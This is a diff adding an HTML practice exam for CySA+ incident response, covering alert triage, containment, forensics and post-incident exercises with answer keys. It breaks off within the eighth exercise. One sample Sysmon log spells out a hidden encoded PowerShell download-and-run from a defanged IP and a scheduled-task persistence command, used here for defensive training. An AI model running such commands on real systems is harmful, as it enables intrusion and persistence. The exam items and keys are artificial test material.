@@ -1,0 +1,2008 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>8.2 - Performing Incident Response Activities</title>
+<script type="application/json" id="cm-exercise-meta">{"topicId": "cysa-plus", "chapter": 8.2, "title": "8.2 - Performing Incident Response Activities", "difficulty": "medium", "questionCount": 30, "estimatedMinutes": 95, "passMark": 70}</script>
+<style>
+:root{
+  --bg:#0b1020; --panel:#121a2e; --panel2:#0e1526; --line:#26334f; --line2:#31415f;
+  --text:#e7edf9; --dim:#a7b6d0; --faint:#8296b4;
+  --accent:#38bdf8; --accent2:#818cf8; --good:#34d399; --bad:#f87171; --warn:#fbbf24;
+  --goodbg:#0c2a22; --badbg:#2e1416; --warnbg:#2b230c; --chip:#1b2540; --chip2:#223054;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font:15px/1.55 system-ui,-apple-system,"Segoe UI",Roboto,Ubuntu,sans-serif;}
+code,.mono,pre,input[type=text],select{font-family:ui-monospace,"Cascadia Mono",Consolas,"Liberation Mono",monospace;}
+pre,code,.logline{font-size:14px;}
+#app{max-width:1100px;margin:0 auto;padding:10px 14px 60px;}
+h1,h2,h3{line-height:1.25}
+button{font:inherit;color:inherit;cursor:pointer}
+a{color:var(--accent)}
+:focus-visible{outline:3px solid #7dd3fc;outline-offset:2px;border-radius:6px}
+
+/* ---------- header ---------- */
+.hdr{position:sticky;top:0;z-index:30;background:linear-gradient(180deg,#101830f2,#0d1428f2);border:1px solid var(--line);border-radius:12px;padding:10px 14px;margin-bottom:10px;backdrop-filter:blur(4px)}
+.hdr-row{display:flex;flex-wrap:wrap;gap:10px;align-items:center;justify-content:space-between}
+.hdr-title{font-weight:700;font-size:16px}
+.hdr-sub{color:var(--dim);font-size:13px;margin-top:2px}
+.hdr-right{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.chipstat{background:var(--chip);border:1px solid var(--line2);border-radius:999px;padding:6px 12px;font-size:13px;white-space:nowrap}
+.chipstat b{color:var(--accent)}
+.timer{font-size:19px;font-weight:700;letter-spacing:1px;padding:6px 14px;border-radius:10px;background:#0a2233;border:1px solid #1c4a63}
+.timer.low{color:var(--warn);border-color:#7a5c12}
+.btn{min-height:44px;min-width:44px;border-radius:10px;border:1px solid var(--line2);background:var(--chip);padding:9px 16px;font-weight:600;transition:background .15s,border-color .15s}
+.btn:hover{background:var(--chip2)}
+.btn.primary{background:#0c4a6e;border-color:#0284c7}
+.btn.primary:hover{background:#075985}
+.btn.good{background:#064e3b;border-color:#059669}
+.btn.warn{background:#4a3806;border-color:#a16207}
+.btn.ghost{background:transparent}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+.pausechip{display:none;border-radius:999px;padding:6px 12px;font-size:13px;font-weight:700}
+.pausechip.on{display:inline-block}
+.pausechip.manual{background:var(--warnbg);border:1px solid #a16207;color:var(--warn)}
+.pausechip.checkp{background:#26102e;border:1px solid #a855f7;color:#d8b4fe}
+
+/* ---------- progress ---------- */
+.pbar{height:10px;background:#0a1024;border:1px solid var(--line);border-radius:999px;overflow:hidden;margin:10px 0 6px}
+.pbar>div{height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .4s}
+.navgrid{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0 4px}
+.navgrid button{min-width:44px;min-height:44px;border-radius:9px;border:1px solid var(--line2);background:var(--chip);font-weight:700;font-size:13px;position:relative}
+.navstate{font-size:10px;margin-left:3px;vertical-align:super;font-weight:800}
+.navgrid button.cur{border-color:var(--accent);box-shadow:0 0 0 2px #38bdf855 inset}
+.navgrid button.checked{border-color:#0e7490;background:#0a2e3d}
+.navgrid button.skipped{border-color:#a16207;background:#3a2c08;color:#fde68a}
+.themestrip{display:flex;flex-wrap:wrap;gap:6px;margin:6px 0 2px}
+.themestrip .tbar{flex:1 1 140px;min-width:140px;background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:4px 8px;font-size:11px;color:var(--dim)}
+.themestrip .tbar>i{display:block;height:5px;border-radius:99px;background:#12203a;margin-top:3px;overflow:hidden}
+.themestrip .tbar>i>u{display:block;height:100%;background:var(--accent);width:0;text-decoration:none;transition:width .4s}
+
+/* ---------- cards / blocks ---------- */
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px;margin:12px 0}
+.exhead{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-bottom:10px}
+.exhead .tag{border-radius:999px;padding:4px 12px;font-size:12px;font-weight:700;border:1px solid var(--line2);background:var(--chip2)}
+.exhead .tag.theme{color:#93c5fd;border-color:#1e40af;background:#0d1c3a}
+.exhead .exnum{margin-left:auto;color:var(--dim);font-size:13px;font-weight:600}
+.blk{border:1px solid var(--line);border-radius:12px;padding:12px 14px;margin:10px 0;background:var(--panel2)}
+.blk .lbl{display:inline-block;font-size:11px;font-weight:800;letter-spacing:1.4px;border-radius:6px;padding:2px 8px;margin-bottom:8px}
+.blk.scenario{border-left:4px solid var(--accent)}
+.blk.scenario .lbl{background:#0c2a44;color:#7dd3fc}
+.blk.question{border-left:4px solid var(--accent2)}
+.blk.question .lbl{background:#251d4a;color:#c4b5fd}
+.blk.answers{border-left:4px solid var(--good)}
+.blk.answers .lbl{background:#0c2a22;color:#6ee7b7}
+.anslabel{font-size:12px;font-weight:800;letter-spacing:1px;color:var(--dim);margin-bottom:8px}
+
+/* options */
+.opt{display:flex;gap:10px;align-items:flex-start;width:100%;text-align:left;background:var(--chip);border:1px solid var(--line2);border-radius:10px;padding:11px 12px;margin:7px 0;min-height:44px}
+.opt:hover{background:var(--chip2)}
+.opt .box{flex:0 0 auto;width:20px;height:20px;border-radius:5px;border:2px solid var(--faint);margin-top:1px}
+.opt:not(.multi) .box{border-radius:50%} /* single choice reads as a radio, multi as a checkbox */
+.opt[aria-pressed=true]{border-color:var(--accent);background:#0d2a44}
+.opt[aria-pressed=true] .box{background:var(--accent);border-color:var(--accent)}
+.opt.multi .box{border-radius:5px}
+.opt.mark-ok{border-color:var(--good);background:var(--goodbg)}
+.opt.mark-bad{border-color:var(--bad);background:var(--badbg)}
+.opt.mark-miss{border-color:var(--warn);background:var(--warnbg)}
+.opt .markw{margin-left:auto;font-size:12px;font-weight:800;white-space:nowrap}
+.markw.ok{color:var(--good)} .markw.bad{color:var(--bad)} .markw.miss{color:var(--warn)}
+
+/* log viewer */
+.logwrap{border:1px solid var(--line);border-radius:10px;background:#080d1c;overflow:hidden}
+.logbar{display:flex;gap:8px;align-items:center;padding:8px 10px;border-bottom:1px solid var(--line);background:#0c1327}
+.logbar input{flex:1;min-height:44px;background:#0a1122;border:1px solid var(--line2);border-radius:8px;color:var(--text);padding:6px 10px}
+.logbar .cnt{font-size:12px;color:var(--dim);white-space:nowrap}
+.loglines{max-height:300px;overflow:auto;padding:8px 10px}
+.logline{white-space:pre-wrap;word-break:break-word;padding:1px 0}
+.hl-ts{color:#67e8f9}.hl-ip{color:#c4b5fd}.hl-bad{color:var(--bad);font-weight:700}.hl-good{color:var(--good)}.hl-kw{color:var(--warn);font-weight:600}.hl-str{color:#fda4af}
+mark{background:#713f12;color:#fde68a;border-radius:3px;padding:0 2px}
+
+/* match */
+.mgrid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.mcol h4{margin:0 0 8px;font-size:13px;color:var(--dim);letter-spacing:.6px;text-transform:uppercase}
+.pool,.slotlist{display:flex;flex-direction:column;gap:8px;min-height:60px}
+.chipitem{background:var(--chip);border:1px solid var(--line2);border-radius:10px;padding:10px 12px;text-align:left;min-height:44px}
+.chipitem.sel{border-color:var(--accent);background:#0d2a44;box-shadow:0 0 0 2px #38bdf855}
+.chipitem.ok{border-color:var(--good);background:var(--goodbg)}
+.chipitem.bad{border-color:var(--bad);background:var(--badbg)}
+.chipitem.miss{border-color:var(--warn);background:var(--warnbg)}
+.slot{border:1.5px dashed var(--line2);border-radius:10px;padding:6px;min-height:56px;background:#0a1122}
+.slot.over{border-color:var(--accent)}
+.slot .slab{font-size:12px;font-weight:800;color:var(--accent);padding:2px 6px;letter-spacing:.4px}
+.slot .filled{margin-top:4px}
+.slot .emptyhint{color:var(--faint);font-size:12px;padding:6px}
+
+/* order */
+.ordlist{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:8px}
+.ordlist li{display:flex;gap:8px;align-items:center;background:var(--chip);border:1px solid var(--line2);border-radius:10px;padding:6px 10px}
+.ordlist li.over{border-color:var(--accent)}
+.ordlist .idx{flex:0 0 30px;text-align:center;font-weight:800;color:var(--accent)}
+.ordlist .otext{flex:1}
+.ordlist .mv{display:flex;flex-direction:row;gap:4px}
+.ordlist .mv button{min-width:44px;min-height:44px;font-size:14px;padding:1px 8px;border-radius:6px;background:var(--chip2);border:1px solid var(--line2)}
+.ordlist li.ok{border-color:var(--good);background:var(--goodbg)}
+.ordlist li.bad{border-color:var(--bad);background:var(--badbg)}
+.ordlist li.miss{border-color:var(--warn);background:var(--warnbg)}
+.dragging{opacity:.45}
+
+/* fill */
+.filltext{line-height:2.1}
+.filltext select{min-height:44px;min-width:150px;max-width:260px;background:#0d2a44;border:1px solid var(--line2);color:var(--text);border-radius:8px;padding:4px 8px;margin:0 4px;font-size:14px}
+.filltext select.ok{border-color:var(--good);background:var(--goodbg)}
+.filltext select.bad{border-color:var(--bad);background:var(--badbg)}
+.filltext select.miss{border-color:var(--warn);background:var(--warnbg)}
+
+/* spot */
+.spotlist{display:flex;flex-direction:column;gap:4px}
+.spotline{display:block;width:100%;text-align:left;background:#0a1122;border:1px solid var(--line);border-left:4px solid var(--line2);border-radius:8px;padding:8px 10px;white-space:pre-wrap;word-break:break-word}
+.spotline:hover{border-color:var(--accent)}
+.spotline.flag{border-left-color:var(--warn);background:#2a230d}
+.spotline .fmark{float:right;font-size:11px;color:var(--warn);font-weight:800}
+.spotline.ok{border-left-color:var(--good);background:var(--goodbg)}
+.spotline.bad{border-left-color:var(--bad);background:var(--badbg)}
+.spotline.miss{border-left-color:var(--warn);background:var(--warnbg)}
+
+/* triage */
+.tblwrap{overflow-x:auto}
+table.tri{width:100%;border-collapse:collapse;min-width:640px}
+table.tri th{font-size:12px;color:var(--dim);text-align:left;padding:8px;border-bottom:1px solid var(--line2);letter-spacing:.5px}
+table.tri td{padding:8px;border-bottom:1px solid var(--line);vertical-align:top}
+table.tri select{min-height:44px;background:#0d2a44;border:1px solid var(--line2);color:var(--text);border-radius:8px;padding:4px 8px;min-width:170px}
+table.tri select.ok{border-color:var(--good);background:var(--goodbg)}
+table.tri select.bad{border-color:var(--bad);background:var(--badbg)}
+table.tri select.miss{border-color:var(--warn);background:var(--warnbg)}
+.rowmark{font-size:12px;font-weight:800;margin-left:6px}
+.rowmark.ok{color:var(--good)}.rowmark.bad{color:var(--bad)}.rowmark.miss{color:var(--warn)}
+
+/* terminal */
+.term{background:#050a16;border:1px solid var(--line2);border-radius:10px;overflow:hidden}
+.termhead{display:flex;gap:6px;padding:8px 10px;background:#0c1327;border-bottom:1px solid var(--line)}
+.termhead i{width:11px;height:11px;border-radius:50%;background:#334155;display:inline-block}
+.termout{padding:10px;min-height:70px;max-height:260px;overflow:auto}
+.termin{display:flex;gap:8px;align-items:center;padding:8px 10px;border-top:1px solid var(--line)}
+.termin .ps{color:var(--good);font-weight:700;white-space:nowrap}
+.termin input{flex:1;min-height:44px;background:transparent;border:none;color:var(--text);font-size:14px}
+.termin input:focus{outline:none}
+
+/* branch */
+.bstep{border:1px solid var(--line);border-left:4px solid var(--accent2);border-radius:10px;padding:10px 12px;margin:10px 0;background:var(--panel2)}
+.bstep h5{margin:0 0 8px;font-size:13px;color:#c4b5fd;letter-spacing:.6px}
+.boutcome{border-radius:8px;padding:8px 10px;margin-top:8px;font-size:14px}
+.boutcome.neutral{background:var(--panel);border:1px dashed var(--line2);color:var(--dim)}
+.boutcome.ok{background:var(--goodbg);border:1px solid var(--good)}
+.boutcome.bad{background:var(--badbg);border:1px solid var(--bad)}
+.bstep .opt.ok{border-color:var(--good);background:var(--goodbg)}
+.bstep .opt.bad{border-color:var(--bad);background:var(--badbg)}
+
+/* feedback + explanation */
+.feedback{margin-top:10px}
+.frow{display:flex;gap:8px;align-items:flex-start;padding:7px 10px;border-radius:8px;margin:5px 0;font-size:14px}
+.frow.ok{background:var(--goodbg);border:1px solid #065f46}
+.frow.bad{background:var(--badbg);border:1px solid #7f1d1d}
+.frow.miss{background:var(--warnbg);border:1px solid #78350f}
+.frow .ic{font-weight:800}
+.frow.ok .ic{color:var(--good)} .frow.bad .ic{color:var(--bad)} .frow.miss .ic{color:var(--warn)}
+.fscore{font-weight:800;margin-top:6px;color:var(--accent)}
+.expl{margin-top:10px;border:1px solid var(--line2);border-radius:10px;padding:12px 14px;background:#0d1730}
+.expl h4{margin:0 0 6px;font-size:13px;letter-spacing:1px;color:#7dd3fc}
+.hintbar{margin-top:8px}
+.hintitem{background:var(--warnbg);border:1px dashed #a16207;border-radius:8px;padding:8px 10px;margin:6px 0;font-size:14px;color:#fde68a}
+
+/* btn row */
+.btnrow{display:flex;flex-wrap:wrap;gap:8px;margin-top:14px}
+.btnrow .spacer{flex:1}
+
+/* intro / review / results */
+.hero{background:linear-gradient(160deg,#101c3d,#0c1226 60%);border:1px solid var(--line2);border-radius:16px;padding:26px 26px 20px;margin-top:14px}
+.hero h1{margin:0 0 6px;font-size:26px}
+.hero .sub{color:var(--dim)}
+.metagrid{display:flex;flex-wrap:wrap;gap:10px;margin:16px 0}
+.metagrid .m{background:var(--panel2);border:1px solid var(--line);border-radius:10px;padding:10px 14px;min-width:120px}
+.metagrid .m b{display:block;font-size:20px;color:var(--accent)}
+.metagrid .m span{font-size:12px;color:var(--dim)}
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:10px;margin:12px 0}
+.rules .r{background:var(--panel2);border:1px solid var(--line);border-radius:10px;padding:12px}
+.rules .r b{color:#7dd3fc;display:block;margin-bottom:4px;font-size:14px}
+.rules .r p{margin:0;font-size:14px;color:var(--dim)}
+.kwpanel{margin-top:14px}
+.kwpanel details{background:var(--panel2);border:1px solid var(--line);border-radius:10px;padding:10px 14px;margin:8px 0}
+.kwpanel summary{cursor:pointer;font-weight:700;color:#7dd3fc}
+.kwpanel .kws{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
+.kwpanel .kws span{background:var(--chip);border:1px solid var(--line2);border-radius:999px;padding:4px 10px;font-size:13px}
+.bigstart{width:100%;font-size:18px;margin-top:14px}
+.banner{border-radius:14px;padding:18px;margin:12px 0;font-weight:700}
+.banner.pass{background:linear-gradient(160deg,#052e22,#0a3d2c);border:1px solid var(--good)}
+.banner.fail{background:linear-gradient(160deg,#3a0d12,#2b0a0e);border:1px solid var(--bad)}
+.banner h2{margin:0 0 4px;font-size:24px}
+.banner p{margin:4px 0;font-weight:400;color:var(--dim)}
+.scorering{display:flex;gap:18px;align-items:center;flex-wrap:wrap;margin:14px 0}
+.ring{width:130px;height:130px;flex:0 0 auto}
+.ring .num{font-size:26px;font-weight:800;fill:var(--text)}
+.ring .cap{font-size:10px;fill:var(--dim)}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:12px 0}
+.stats .s{background:var(--panel2);border:1px solid var(--line);border-radius:10px;padding:10px}
+.stats .s b{display:block;font-size:18px}
+.stats .s span{font-size:12px;color:var(--dim)}
+.reprow{border:1px solid var(--line);border-radius:10px;margin:8px 0;background:var(--panel2)}
+.reprow summary{display:flex;gap:10px;align-items:center;padding:10px 12px;cursor:pointer;flex-wrap:wrap}
+.reprow .st{font-size:11px;font-weight:800;border-radius:6px;padding:3px 8px;letter-spacing:.5px}
+.st.full{background:#064e3b;color:#6ee7b7}.st.partial{background:#3a2c08;color:#fde68a}.st.zero{background:#3a0d12;color:#fca5a5}.st.skipped{background:#2b230c;color:#fbbf24}
+.reprow .rtitle{font-weight:600}
+.reprow .rpts{margin-left:auto;color:var(--dim);font-size:13px}
+.repbody{padding:0 14px 12px;font-size:14px;color:var(--dim)}
+.repbody .yes{color:var(--good)} .repbody .no{color:var(--bad)}
+.warnbox{background:var(--warnbg);border:1px solid #a16207;border-radius:10px;padding:12px 14px;margin:10px 0}
+.pauseveil{position:fixed;inset:0;z-index:40;display:none;align-items:center;justify-content:center;background:#0b1020cc;flex-direction:column;gap:12px;text-align:center;padding:20px}
+.pauseveil.on{display:flex}
+body.manual #stage{filter:blur(14px) grayscale(.6);pointer-events:none;user-select:none}
+.reviewgrid{display:flex;flex-wrap:wrap;gap:8px;margin:10px 0}
+.reviewgrid button{min-width:52px;min-height:44px;border-radius:9px;border:1px solid var(--line2);background:var(--chip);font-weight:700}
+.reviewgrid button.cur{border-color:var(--accent)}
+.reviewgrid button.checked{border-color:#0e7490;background:#0a2e3d}
+.reviewgrid button.skipped{border-color:#a16207;background:#3a2c08;color:#fde68a}
+@media (max-width:760px){.mgrid{grid-template-columns:1fr}.hdr-title{font-size:14px}.timer{font-size:16px}}
+@media (prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
+
+</style>
+</head>
+<body>
+<div id="app"><noscript>This practice exam requires JavaScript.</noscript></div>
+<script>
+window.EX = [];
+window.__CM_TEST_FAST__ = 0;
+</script>
+<script>
+window.KW = {
+"Detection & Analysis":["alert triage","true positive","false positive","log review","event correlation","SIEM","indicator of compromise (IoC)","indicator of attack (IoA)","incident scoping","initial validation","beaconing","DNS tunneling","lateral movement","attack path"],
+"Containment":["isolation","network segmentation","quarantine","removal from network","IoC blocking","account disable","DNS sinkhole","business-impact trade-off"],
+"Eradication":["malware removal","reimaging / rebuild","known-good image","patching","credential reset","persistence removal","scheduled task","run key","webshell removal"],
+"Recovery":["restore from backup","backup integrity","validation testing","increased monitoring","return to production","clean baseline"],
+"Evidence & Forensics":["order of volatility","memory capture","disk image","SHA-256 hashing","chain of custody","write blocker","evidence integrity"],
+"Post-Incident & Program":["root cause analysis","lessons learned","after-action report","playbook update","runbook","breach notification","GDPR 72 hours","HIPAA","stakeholder communication","severity matrix","escalation","damage assessment","tabletop exercise","MTTD / MTTR","DFIR retainer","CSIRT","EDR","SIEM","SOAR","sandbox"]
+};
+
+</script>
+<script>
+window.CFG = {
+  sev: "MEDIUM",
+  perEx: 190,
+  examTitle: "CompTIA CySA+ (CS0-003) — 8.2 Performing Incident Response Activities",
+  termLabel: "Terminal exercises",
+  termHelp: "In this MEDIUM exam the two terminal exercises tell you which command family to use (for example \u201cuse a grep command\u201d), give a flag hint, and show the output shape to expect. You still build the correct command yourself.",
+  blurb: "This MEDIUM practice exam turns CySA+ objective 3.2 \u2014 <b>perform incident response activities</b> \u2014 into realistic SOC work: triaging alert queues, reading logs and choosing containment, eradication, recovery and post-incident actions. Every exercise needs multi-step reasoning with realistic data, but a well-prepared candidate can reach the correct path without expert-level intuition. Scenario, question and answers are always shown in separate, clearly labelled blocks."
+};
+
+</script>
+<script>
+/* ===== MEDIUM exercises 1-6 ===== */
+EX.push(
+{
+  id:'m01', type:'triage', theme:'Detection & Analysis', typeLabel:'Alert triage',
+  title:'SOC morning queue triage',
+  scenario:'You start the morning shift as the SOC analyst on duty. The SIEM queue holds five alerts from overnight. Your runbook says: classify each alert before touching any system, and classify honestly \u2014 a wrong label sends the queue in the wrong direction.',
+  question:'Classify each alert using the dropdown next to it.',
+  ansLabel:'CLASSIFY EACH ALERT \u2014 one choice per row',
+  opts:['Brute-force / credential attack','Malware infection','C2 beaconing','False positive','Policy violation'],
+  rows:[
+    {t:'Antivirus: EICAR test string found on the isolated malware-analysis VM', meta:'Lab VM \u00b7 03:05', a:3},
+    {t:'SIEM: 312 failed VPN logins across 40 usernames in 9 minutes, all from 198[.]51[.]100[.]7', meta:'VPN gateway \u00b7 02:14', a:0},
+    {t:'DLP: employee uploaded 200 MB of internal documents to a personal cloud drive', meta:'DLP \u00b7 04:48', a:4},
+    {t:'EDR: winword.exe spawned powershell.exe, which fetched a script from an external host', meta:'Finance workstation \u00b7 01:37', a:1},
+    {t:'Proxy: 5 hosts each sent a small POST to hxxp://cdn-metrics[.]example/api every 60 seconds, all night', meta:'Proxy \u00b7 00:00\u201306:00', a:2}
+  ],
+  hints:['Ask two questions per alert: who raised it, and does the pattern repeat in a machine-like way?'],
+  explain:'The EICAR row is a false positive: EICAR is a harmless test file, and it sits on the analysis VM where testers detonate samples on purpose. The VPN row is a brute-force / credential attack: many failures against many usernames from one source is a password-spraying pattern. The DLP row is a policy violation: the upload itself worked, so it is not malware \u2014 it breaks the data-handling rule. The Word-to-PowerShell row is a malware infection: a document spawning PowerShell is classic dropper behaviour, not normal office use. The metronome POST row is C2 beaconing: equal 60-second intervals all night look like a machine, not a human.'
+},
+{
+  id:'m02', type:'logview', theme:'Detection & Analysis', typeLabel:'Log analysis',
+  title:'Sysmon trail on WS-114',
+  scenario:'An EDR alert points at workstation WS-114. You pull the local Sysmon log before deciding anything. The playbook says: confirm what happened from logs, then choose the containment action that matches the finding.',
+  question:'What does this log trail show, and what is the correct first action per the containment playbook?',
+  ansLabel:'CHOOSE ONE',
+  logs:[
+    '02:11:03 Sysmon ID1  WS-114  Process Create: winword.exe \u2192 powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA',
+    '02:11:05 Sysmon ID3  WS-114  Network connect: 203[.]0[.]113[.]77:443  Image: powershell.exe',
+    '02:11:06 Sysmon ID1  WS-114  Process Create: powershell.exe -c "IEX(New-Object Net.WebClient).DownloadFile(\'hxxp://203[.]0[.]113[.]77/upd.ps1\',\'C:\\Users\\Public\\upd.ps1\')"',
+    '02:11:41 Sysmon ID11 WS-114  File Create: C:\\Users\\Public\\upd.ps1',
+    '02:12:02 Sysmon ID1  WS-114  Process Create: schtasks.exe /create /tn "Updater" /tr "powershell -f C:\\Users\\Public\\upd.ps1" /sc onlogon',
+    '02:12:10 Sysmon ID1  WS-114  Process Create: schtasks.exe /run /tn "Updater"',
+    '02:12:31 Sysmon ID3  WS-114  Network connect: 203[.]0[.]113[.]77:443  Image: powershell.exe',
+    '02:19:55 EDR      WS-114  Alert: suspicious script execution (severity: high)'
+  ],
+  options:[
+    {t:'A legitimate administrator running remote maintenance \u2014 monitor quietly for now.', ok:false},
+    {t:'Scripted download plus scheduled-task persistence \u2014 isolate WS-114 and preserve evidence.', ok:true},
+    {t:'A failed software update \u2014 reboot the workstation and reopen the ticket if it repeats.', ok:false},
+    {t:'A data-loss event in progress \u2014 notify HR and disable USB storage on the host.', ok:false}
+  ],
+  hints:['Look at what created the scheduled task and what that task runs at logon.'],
+  explain:'The trail shows a document spawning a hidden PowerShell (a dropper), a download from 203[.]0[.]113[.]77, and then schtasks.exe creating an "Updater" task that runs the same script at every logon. That is persistence, so the isolation answer is right: isolate the host (containment) and keep the evidence \u2014 do not wipe it yet. The administrator option fails because admins do not hide scripts with -enc -w hidden. The update option ignores the deliberate scheduled task. The data-loss option describes a different problem; nothing here moved files out.'
+},
+{
+  id:'m03', type:'match', theme:'Post-Incident & Program', typeLabel:'Drag & drop matching',
+  title:'Actions onto IR phases',
+  scenario:'A new SOC hire has mixed up the incident response lifecycle. You print the six actions from last month\u2019s incident and ask them to sort the actions under the phase where each one belongs (NIST lifecycle: Preparation, Detection & Analysis, Containment, Eradication, Recovery, Lessons Learned).',
+  question:'Drag each action onto the phase where it belongs.',
+  ansLabel:'DRAG ITEMS TO SLOTS \u2014 one item per phase',
+  slots:[
+    {label:'Preparation'},
+    {label:'Detection & Analysis'},
+    {label:'Containment'},
+    {label:'Eradication'},
+    {label:'Recovery'},
+    {label:'Lessons Learned'}
+  ],
+  items:[
+    {t:'Keep the IR contact list and forensic kit up to date', s:0},
+    {t:'Correlate SIEM alerts and confirm the incident is real', s:1},
+    {t:'Unplug the affected server from the network', s:2},
+    {t:'Reimage the host and patch the exploited flaw', s:3},
+    {t:'Restore data from a clean backup and test the service', s:4},
+    {t:'Hold the review meeting and update the playbook', s:5}
+  ],
+  hints:['Containment stops the bleeding; eradication removes the cause; recovery brings service back.'],
+  explain:'Preparation happens before any incident: kits, contacts, training. Detection & Analysis is where you correlate and confirm. Containment stops spread without fixing the cause \u2014 unplugging is the textbook move. Eradication removes the attacker\u2019s foothold: reimage plus patching. Recovery returns service: restore, test, then go live. Lessons Learned closes the loop: review and playbook update. Mixing containment with eradication is the most common mix-up \u2014 containment is about stopping now, eradication about removing for good.'
+},
+{
+  id:'m04', type:'multi', theme:'Containment', typeLabel:'Multi-select',
+  title:'Containment actions for WS-077',
+  scenario:'WS-077 shows ransomware precursors: mass file renames have begun and the EDR sees the process reaching out to an unknown host. The incident manager asks you to propose containment actions now. The playbook reminds you: containment buys time; it does not fix the host and it must not destroy evidence.',
+  question:'Select ALL actions that are appropriate as containment for this incident right now.',
+  ansLabel:'SELECT ALL THAT APPLY \u2014 several are correct, some are traps',
+  options:[
+    {t:'Disconnect WS-077 from the network (disable NIC / Wi-Fi)', ok:true},
+    {t:'Disable the workstation owner\u2019s domain account', ok:true},
+    {t:'Block the destination IP the EDR flagged at the firewall', ok:true},
+    {t:'Reimage WS-077 immediately so the malware is gone today', ok:false},
+    {t:'Start restoring the file server from last night\u2019s backup', ok:false},
+    {t:'Email the suspicious file to all staff so they can check their PCs', ok:false}
+  ],
+  hints:['Two of the wrong options belong to later IR phases \u2014 which ones?'],
+  explain:'Containment = stop spread now, keep options open. Disconnecting the host, disabling the user\u2019s account (the attacker may reuse the session) and blocking the destination IP are all fast, reversible containment moves. These choices also feed incident scoping \u2014 the working list of what is in or out of the incident \u2014 because containment grows or shrinks as the scope does. Reimaging is eradication and would destroy volatile evidence you may still need. Restoring backups is recovery \u2014 far too early while the source is active. Emailing the sample spreads it. Wrong picks are red, missed picks amber.'
+},
+{
+  id:'m05', type:'qcm', theme:'Containment', typeLabel:'Multiple choice',
+  title:'First move on live ransomware',
+  scenario:'At 09:12 users report files turning into .locked on the shared drive FS-01. The backup team confirms the encryptor is still running. Your phone is ringing; the ticket is P1.',
+  question:'What is your first action?',
+  ansLabel:'CHOOSE ONE',
+  options:[
+    {t:'Isolate FS-01 from the network to stop the encryption spreading', ok:true},
+    {t:'Power FS-01 off immediately so nothing further can happen', ok:false},
+    {t:'Run a full antivirus scan on FS-01 while it stays online', ok:false},
+    {t:'Restore the affected shares from backup before anything else', ok:false}
+  ],
+  hints:['You want to stop spread, but not lose what is still in memory.'],
+  explain:'Isolation is the first move: it stops the encryptor reaching new shares (lateral movement to the next server) while keeping the machine running so RAM can be captured later. A hard power-off throws away memory evidence and can corrupt things further. A full scan on a live, infected share server is slow and the malware may fight back. Restoring first is recovery before containment \u2014 the encryptor would just hit the restored data again.'
+},
+{
+  id:'m06', type:'order', theme:'Evidence & Forensics', typeLabel:'Timeline ordering',
+  title:'Order of volatility',
+  scenario:'Legal has approved evidence collection on a compromised workstation. Your team lead asks you to plan collection so the most volatile data is captured before it disappears. The classic order-of-volatility rule: what vanishes first gets collected first.',
+  question:'Drag the sources into the correct collection order (most volatile first).',
+  ansLabel:'ORDER THE STEPS \u2014 position 1 is the most volatile',
+  ordered:[
+    'CPU registers, cache and RAM contents',
+    'Swap file and page file',
+    'Internal disk (system and user files)',
+    'Log files on remote central servers',
+    'Archived and backup media'
+  ],
+  hints:['Ask of each source: how fast does it change or disappear on its own?'],
+  explain:'Order of volatility: RAM and registers die with power or time \u2014 capture them first. The swap/page file changes constantly and holds memory leftovers, so it comes second. The disk is stable while powered but changes with every write, so image it third. Remote logs are appended by other systems and survive longer, fourth. Backups and archives barely change \u2014 last. Collecting the disk before RAM is the classic mistake: the image is useless if the live process list is gone.'
+}
+);
+
+</script>
+<script>
+/* ===== MEDIUM exercises 7-12 ===== */
+EX.push(
+{
+  id:'m07', type:'fill', theme:'Post-Incident & Program', typeLabel:'Fill in the blanks',
+  title:'Complete the incident report',
+  scenario:'The incident manager asks you to finish the summary section of the incident report for the VPN appliance breach. The template uses exact IR vocabulary \u2014 the review board rejects reports with vague words.',
+  question:'Pick the correct term for each blank from the word bank.',
+  ansLabel:'COMPLETE THE BLANKS \u2014 each word is used at most once; two bank words are decoys',
+  text:'Once {{0}} stopped the attacker from spreading further, the team carried out {{1}} by removing the malware and patching the VPN appliance. The {{2}} was the unpatched VPN vulnerability, not the user who clicked the email. Because the disk was imaged, {{3}} was documented for every person who handled the copies. Finally, the {{4}} meeting produced nine action items, including two new detection rules.',
+  bank:['containment','eradication','root cause','chain of custody','lessons learned','recovery','quarantine'],
+  blanks:[{a:'containment'},{a:'eradication'},{a:'root cause'},{a:'chain of custody'},{a:'lessons learned'}],
+  hints:['Two blanks describe phases, one describes a meeting, one describes evidence handling, one describes the underlying weakness.'],
+  explain:'Containment stops spread; eradication removes the malware and fixes the flaw. The root cause is the underlying weakness \u2014 the unpatched VPN appliance \u2014 not the person. Chain of custody is the documented handling record that keeps evidence usable in court. Lessons Learned is the closing review meeting that produces action items. "Recovery" and "quarantine" are decoys: the sentences describe stopping spread and removing the cause, not restoring service or holding files.'
+},
+{
+  id:'m08', type:'terminal', theme:'Detection & Analysis', typeLabel:'Terminal',
+  title:'Grep the auth log',
+  scenario:'The service account svc_sql may be under a password-guessing attack on server app01. In this training shell the auth log sits at logs/auth.log (typing "ls" shows the logs/ folder).',
+  question:'Use a grep command to show every line that mentions svc_sql in logs/auth.log. A flag hint: plain grep is enough \u2014 no fancy flags needed. Output shape: syslog lines like "Mar 12 02:14:22 app01 sshd[2211]: Failed password for USER from IP port N ssh2".',
+  ansLabel:'TYPE THE COMMAND \u2014 then press Enter, then Check',
+  host:'analyst@app01',
